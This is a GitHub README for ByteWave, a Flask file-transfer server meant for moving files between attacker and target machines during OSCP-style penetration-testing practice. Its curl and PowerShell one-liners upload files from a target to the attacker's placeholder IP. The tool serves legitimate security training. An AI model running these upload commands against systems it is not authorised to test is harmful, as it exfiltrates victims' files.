
# ByteWave
<p align="center">
 	 <img src="https://raw.githubusercontent.com/sazzad1337/sazzad1337/main/images/bytewave.png" alt=bytewave"/>
	</p>

ByteWave is a simple Flask web application for uploading, downloading, and managing files between both attackers <-----> target endpoints. It provides a user-friendly interface for handling file operations from CLI and browsers.
This file upload technique can be valuable for the students preparing for the OSCP exam.

## Setup

1. Clone the repository:

   ```bash
   git clone https://github.com/sazzad1337/ByteWave.git

2. Run the Flask application:

	```bash
	python bytewave.py

## Features


   - **File Upload:**
   
     **Linux:**
     <be>
	<p align="center">
 	 <img src="https://raw.githubusercontent.com/sazzad1337/sazzad1337/main/images/curl.png" alt="poc"/>
	</p>

     ```bash
     curl -F "file=@FILENAME" http://IP/upload
     ```

     **Windows PowerShell:**
     ```bash
     (New-Object System.Net.WebClient).UploadFile('http://IP/upload', 'FILENAME')
     ```


   - **Manage Files:**
   
     ```bash
     http://IP/files
     ```
<p align="center">
  <img src="https://raw.githubusercontent.com/sazzad1337/sazzad1337/main/images/files.png" alt="files"/>
</p>
